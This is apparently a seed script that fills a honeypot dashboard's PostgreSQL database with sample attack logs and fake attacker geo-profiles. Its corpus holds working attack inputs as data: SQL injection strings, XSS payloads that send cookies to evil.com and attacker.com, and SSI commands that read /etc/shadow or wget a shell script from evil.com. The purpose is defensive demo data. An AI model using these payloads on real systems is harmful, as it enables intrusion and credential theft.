"""
Seed script — populate PostgreSQL with realistic attack logs for the dashboard.

Run once:  python seed_attacks.py
"""

import asyncio
import random
from datetime import datetime, timedelta, timezone
from uuid import uuid4

from database_postgres import db
from models_sqlalchemy import HoneypotLog, Tenant

# ── Realistic attack corpus ────────────────────────────────────────

ATTACKS = [
    # SQL Injection variants
    {"raw": "admin' OR '1'='1", "type": "SQLI", "conf": 0.95, "resp": "Error 1064: You have an error in your SQL syntax", "status": 500},
    {"raw": "' UNION SELECT username, password FROM users--", "type": "SQLI", "conf": 0.98, "resp": "Database error: Table 'users' doesn't exist", "status": 500},
    {"raw": "1' AND 1=1--", "type": "SQLI", "conf": 0.91, "resp": "Query returned 0 results", "status": 200},
    {"raw": "'; DROP TABLE users; --", "type": "SQLI", "conf": 0.97, "resp": "Syntax error near unexpected token", "status": 500},
    {"raw": "' OR 1=1 LIMIT 1 OFFSET 1--", "type": "SQLI", "conf": 0.93, "resp": "No results found", "status": 200},
    {"raw": "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--", "type": "SQLI", "conf": 0.96, "resp": "XPATH syntax error", "status": 500},
    {"raw": "1; WAITFOR DELAY '0:0:5'--", "type": "SQLI", "conf": 0.89, "resp": "Request timed out", "status": 408},
    {"raw": "' UNION SELECT NULL,NULL,table_name FROM information_schema.tables--", "type": "SQLI", "conf": 0.97, "resp": "Column count mismatch", "status": 500},

    # XSS variants
    {"raw": "<script>alert('XSS')</script>", "type": "XSS", "conf": 0.92, "resp": "Input sanitized. Potential XSS detected.", "status": 200},
    {"raw": "<img src=x onerror=alert(document.cookie)>", "type": "XSS", "conf": 0.94, "resp": "Input blocked: Potential XSS detected", "status": 200},
    {"raw": "<svg/onload=fetch('https://evil.com/steal?c='+document.cookie)>", "type": "XSS", "conf": 0.96, "resp": "Content Security Policy violation", "status": 403},
    {"raw": "javascript:void(document.location='http://xss.rocks/'+document.cookie)", "type": "XSS", "conf": 0.91, "resp": "Invalid URL scheme", "status": 400},
    {"raw": "\"><script>new Image().src='http://attacker.com/?c='+document.cookie</script>", "type": "XSS", "conf": 0.93, "resp": "Malformed input rejected", "status": 400},

    # SSI variants
    {"raw": "<!--#exec cmd=\"ls\"-->", "type": "SSI", "conf": 0.88, "resp": "Server-side includes are disabled", "status": 403},
    {"raw": "<!--#include virtual=\"/etc/passwd\"-->", "type": "SSI", "conf": 0.89, "resp": "File not found", "status": 404},
    {"raw": "<!--#exec cmd=\"cat /etc/shadow\"-->", "type": "SSI", "conf": 0.92, "resp": "Permission denied", "status": 403},
    {"raw": "<!--#exec cmd=\"wget http://evil.com/shell.sh\"-->", "type": "SSI", "conf": 0.95, "resp": "Command execution disabled", "status": 403},

    # Brute Force
    {"raw": "admin", "type": "BRUTE_FORCE", "conf": 0.75, "resp": "Invalid credentials", "status": 401},
    {"raw": "password123", "type": "BRUTE_FORCE", "conf": 0.78, "resp": "Account locked due to multiple failed attempts", "status": 429},
    {"raw": "root:toor", "type": "BRUTE_FORCE", "conf": 0.82, "resp": "Invalid credentials. 3 attempts remaining.", "status": 401},
    {"raw": "administrator:P@ssw0rd!", "type": "BRUTE_FORCE", "conf": 0.80, "resp": "Authentication failed", "status": 401},
    {"raw": "test:test123", "type": "BRUTE_FORCE", "conf": 0.72, "resp": "Account does not exist", "status": 401},

    # Benign traffic
    {"raw": "Hello, how are you?", "type": "BENIGN", "conf": 0.0, "resp": "Request processed successfully", "status": 200},
    {"raw": "GET /api/status HTTP/1.1", "type": "BENIGN", "conf": 0.0, "resp": "OK", "status": 200},
    {"raw": "What is the weather today?", "type": "BENIGN", "conf": 0.0, "resp": "I'm not a weather service", "status": 200},
    {"raw": "help", "type": "BENIGN", "conf": 0.0, "resp": "Available commands: help, status, info", "status": 200},
]

# Attacker profiles with geo data
ATTACKERS = [
    {"ip": "185.220.101.34", "ua": "sqlmap/1.6.12", "country": "Germany", "city": "Frankfurt", "lat": 50.1109, "lng": 8.6821, "isp": "Hetzner Online"},
    {"ip": "103.104.226.58", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "country": "India", "city": "Mumbai", "lat": 19.0760, "lng": 72.8777, "isp": "Reliance Jio"},
    {"ip": "45.33.32.156", "ua": "Burp Suite Professional", "country": "United States", "city": "Fremont", "lat": 37.5485, "lng": -121.9886, "isp": "Linode"},
    {"ip": "91.240.118.172", "ua": "Python-requests/2.28.0", "country": "Russia", "city": "Moscow", "lat": 55.7558, "lng": 37.6173, "isp": "Rostelecom"},
    {"ip": "118.25.6.39", "ua": "curl/7.68.0", "country": "China", "city": "Shanghai", "lat": 31.2304, "lng": 121.4737, "isp": "Tencent Cloud"},
    {"ip": "198.51.100.10", "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6)", "country": "United Kingdom", "city": "London", "lat": 51.5074, "lng": -0.1278, "isp": "British Telecom"},
    {"ip": "93.184.216.34", "ua": "Nikto/2.1.6", "country": "Netherlands", "city": "Amsterdam", "lat": 52.3676, "lng": 4.9041, "isp": "Edgecast"},
    {"ip": "177.71.244.98", "ua": "Hydra v9.2", "country": "Brazil", "city": "São Paulo", "lat": -23.5505, "lng": -46.6333, "isp": "NET Virtua"},
    {"ip": "14.225.210.123", "ua": "Mozilla/5.0 (X11; Linux x86_64)", "country": "Vietnam", "city": "Hanoi", "lat": 21.0285, "lng": 105.8542, "isp": "VNPT"},
    {"ip": "49.248.21.6", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "country": "Japan", "city": "Tokyo", "lat": 35.6762, "lng": 139.6503, "isp": "NTT Communications"},
    {"ip": "156.67.103.77", "ua": "Nmap Scripting Engine", "country": "South Africa", "city": "Johannesburg", "lat": -26.2041, "lng": 28.0473, "isp": "Afrihost"},
    {"ip": "77.68.11.215", "ua": "Mozilla/5.0 (Windows NT 10.0)", "country": "Turkey", "city": "Istanbul", "lat": 41.0082, "lng": 28.9784, "isp": "Turk Telekom"},
]

DEFAULT_TENANT_ID = "00000000-0000-0000-0000-000000000001"


async def seed():
    """Insert 50 realistic attack logs spanning the last 48 hours."""
    await db.connect()
    await db.create_tables()

    async with db.session_factory() as session:
        # Ensure default tenant exists
        from sqlalchemy import select as _sel
        existing = (await session.execute(
            _sel(Tenant).where(Tenant.id == DEFAULT_TENANT_ID)
        )).scalar_one_or_none()

        if not existing:
            session.add(Tenant(
                id=DEFAULT_TENANT_ID,
                api_key="chameleon-default-key-001",
                email="admin@chameleon.local",
                credit_balance=9999,
            ))
            await session.commit()
            print("✅ Created default tenant")

        # Check existing count
        count = (await session.execute(
            _sel(func.count()).select_from(HoneypotLog)
        )).scalar() or 0

        if count >= 40:
            print(f"⚠️  Database already has {count} logs — skipping seed")
            return

        IST = timezone(timedelta(hours=5, minutes=30))
        now = datetime.now(IST)
        logs_to_add = []

        # Generate 50 varied attack logs spread over the last 48h
        for i in range(50):
            attack = random.choice(ATTACKS)
            attacker = random.choice(ATTACKERS)

            # Malicious attackers tend to hit more often; benign less
            if attack["type"] == "BENIGN":
                attacker = random.choice([a for a in ATTACKERS if "Mozilla" in a["ua"]])

            minutes_ago = random.randint(1, 2880)  # up to 48 hours
            ts = now - timedelta(minutes=minutes_ago)

            delay = round(random.uniform(0.5, 8.0), 1) if attack["type"] != "BENIGN" else 0.0

            log = HoneypotLog(
                id=uuid4(),
                tenant_id=DEFAULT_TENANT_ID,
                attacker_ip=attacker["ip"],
                command_entered=attack["raw"],
                response_sent=attack["resp"],
                timestamp=ts,
                log_metadata={
                    "classification": {
                        "attack_type": attack["type"],
                        "confidence": attack["conf"],
                        "is_malicious": attack["type"] != "BENIGN",
                    },
                    "deception_response": {
                        "message": attack["resp"],
                        "delay_applied": delay,
                        "http_status": attack["status"],
                    },
                    "geo_location": {
                        "country": attacker["country"],
                        "city": attacker["city"],
                        "latitude": attacker["lat"],
                        "longitude": attacker["lng"],
                        "isp": attacker["isp"],
                    },
                    "user_agent": attacker["ua"],
                },
            )
            logs_to_add.append(log)

        session.add_all(logs_to_add)
        await session.commit()
        print(f"✅ Seeded {len(logs_to_add)} attack logs into PostgreSQL")


if __name__ == "__main__":
    from sqlalchemy import func
    asyncio.run(seed())
